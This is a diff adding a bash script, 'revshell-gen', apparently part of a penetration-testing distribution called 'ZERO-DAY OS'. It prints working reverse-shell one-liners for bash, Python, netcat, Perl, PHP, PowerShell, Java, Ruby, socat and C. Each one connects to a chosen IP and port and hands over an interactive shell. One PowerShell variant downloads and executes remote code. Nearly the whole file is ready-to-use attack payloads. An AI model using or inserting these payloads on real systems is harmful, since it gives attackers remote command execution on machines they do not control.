@@ -1,0 +1,69 @@
+#!/bin/bash
+# /usr/local/bin/revshell-gen
+# Generate reverse shell one-liners
+# Usage: revshell-gen <type> <ip> [port]
+# Types: bash, python, nc, perl, php, powershell, java, ruby, socat, c
+
+TYPE="$1"
+IP="$2"
+PORT="${3:-4444}"
+
+if [ -z "$TYPE" ] || [ -z "$IP" ]; then
+    echo "Usage: revshell-gen <type> <ip> [port]"
+    echo ""
+    echo "Types: bash, python, nc, perl, php, powershell, java, ruby, socat, c"
+    exit 1
+fi
+
+echo "[*] ZERO-DAY OS — Reverse Shell Generator"
+echo "[*] Type: $TYPE | IP: $IP | Port: $PORT"
+echo ""
+
+case "$TYPE" in
+    bash)
+        echo "bash -i >& /dev/tcp/$IP/$PORT 0>&1"
+        ;;
+    python|python3|py)
+        echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+        ;;
+    nc|netcat)
+        echo "nc $IP $PORT -e /bin/sh"
+        ;;
+    ncbusybox)
+        echo "busybox nc $IP $PORT -e /bin/sh"
+        ;;
+    perl)
+        echo "perl -e 'use Socket;\$i=\"$IP\";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")};'"
+        ;;
+    php)
+        echo "php -r '\$sock=fsockopen(\"$IP\",$PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+        ;;
+    powershell|ps|ps1)
+        echo "powershell -e \$(echo -n 'IEX(New-Object Net.WebClient).DownloadString(\"http://$IP/$PORT\")' | base64)"
+        echo "# Or raw:"
+        echo "\$client = New-Object System.Net.Sockets.TCPClient('$IP',$PORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
+        ;;
+    java)
+        echo "Runtime rt = Runtime.getRuntime();rt.exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'\");"
+        echo "// Or compile & run the following class:"
+        echo "import java.io.*;import java.net.*;public class RevShell{public static void main(String[]a){try{Socket s=new Socket(\"$IP\",$PORT);Process p=Runtime.getRuntime().exec(\"/bin/sh\");InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);}p.destroy();s.close();}catch(Exception e){}}}"
+        ;;
+    ruby)
+        echo "ruby -rsocket -e 'f=TCPSocket.open(\"$IP\",$PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+        ;;
+    socat)
+        echo "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$IP:$PORT"
+        ;;
+    c)
+        echo "#include <stdio.h>#include <sys/socket.h>#include <netinet/in.h>#include <unistd.h>"
+        echo "int main(){int s=socket(2,1,0);struct sockaddr_in a;a.sin_family=2;a.sin_port=htons($PORT);a.sin_addr.s_addr=inet_addr(\"$IP\");connect(s,(struct sockaddr*)&a,sizeof(a));dup2(s,0);dup2(s,1);dup2(s,2);execve(\"/bin/sh\",0,0);}"
+        ;;
+    *)
+        echo "[!] Unknown type: $TYPE"
+        echo "Available: bash, python, nc, perl, php, powershell, java, ruby, socat, c"
+        exit 1
+        ;;
+esac
+
+echo ""
+echo "[*] Stabilize with: revshell-stabilize"
